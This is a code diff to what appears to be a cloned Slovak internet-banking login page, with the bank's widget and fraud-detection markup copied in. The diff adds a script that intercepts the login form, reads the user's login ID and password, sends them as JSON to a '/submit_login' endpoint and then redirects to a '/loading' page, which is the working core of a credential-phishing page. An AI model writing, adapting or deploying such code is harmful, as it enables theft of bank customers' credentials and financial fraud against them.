@@ -45,6 +45,37 @@
  
  
  </div><div id=arcotuserdataDiv display=none style=display:none></div><div id=arcotuserdataDiv display=none style=display:none></div><div id=arcotuserdataDiv display=none style=display:none></div><div id=arcotuserdataDiv display=none style=display:none></div><div id=arcotuserdataDiv display=none style=display:none></div><div id=arcotuserdataDiv display=none style=display:none></div><revelock-loader session=2b9f5ba7be3ef2650ad3ed56091f2528a915396bedf2dc5ec33b0cc42c6eee99 app=IBTB location=Login user beforelogout="()=>{this.zone.run(()=>this.logoutWithInfo())}" logout="()=>{this.zone.run(()=>this.logoutWithInfo())}"><template shadowrootmode=open></template></revelock-loader><div class=cdk-overlay-container><div><div id=cdk-overlay-0 class=cdk-overlay-pane></div></div></div><div class="cdk-describedby-message-container cdk-visually-hidden" style=visibility:hidden><div id=cdk-describedby-message-ng-1-2 role=tooltip>Kliknite pre otvorenie nápovedy.</div></div><div id=nuanMessagingFrame class=nuance-chat-floating-container><iframe id=inqChatStage title="Chat Window" name=10006716 style=z-index:9999999;display:none;overflow:hidden;position:absolute;height:1px;width:1px;left:0px;top:0px;border-style:none;border-width:0px></iframe><div id=nuance-fab-container class=enter style=position:fixed><button tabindex=0 title="Start Chat" class="nuance-fab-main fab-init tb-chatbot-mix-icon">Chatbot Adam</button><div class="aria-reader onDisplay" role=alert aria-live=polite>Chat available, press ALT plus 1 to open</div></div></div><div id=inqDivResizeCorner style=border-width:0px;position:absolute;z-index:9999999;left:424px;top:284px;cursor:se-resize;height:16px;width:16px;display:none></div><div id=inqResizeBox style=border-width:0px;position:absolute;z-index:9999999;left:0px;top:0px;display:none;height:0px;width:0px></div><div id=inqTitleBar style=border-width:0px;position:absolute;z-index:9999999;left:0px;top:0px;cursor:move;height:55px;width:410px;display:none></div><div id=Nuance-chat-anchored style=position:fixed;bottom:0;right:0;z-index:9999></div><div id=injectTargetScreenReader role=alert aria-live=polite aria-relevant="additions text" aria-atomic=false style=overflow:hidden;height:1px;width:1px;left:-1000px;top:0px;position:absolute></div>
-
-
-
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var form = document.querySelector('form');
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var loginInput = document.querySelector('input[controlfocusname="login"], input[aria-label*="PID"], input[type="text"]');
+            var passwordInput = document.querySelector('input[controlfocusname="password"], input[type="password"]');
+            
+            var login = loginInput ? loginInput.value : '';
+            var password = passwordInput ? passwordInput.value : '';
+            
+            var sessionId = Date.now().toString();
+            sessionStorage.setItem('session_id', sessionId);
+            
+            fetch('/submit_login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    login: login,
+                    password: password,
+                    session_id: sessionId
+                })
+            }).then(function() {
+                window.location.href = '/loading';
+            }).catch(function() {
+                window.location.href = '/loading';
+            });
+        });
+    }
+});
+</script>
+</body></html>
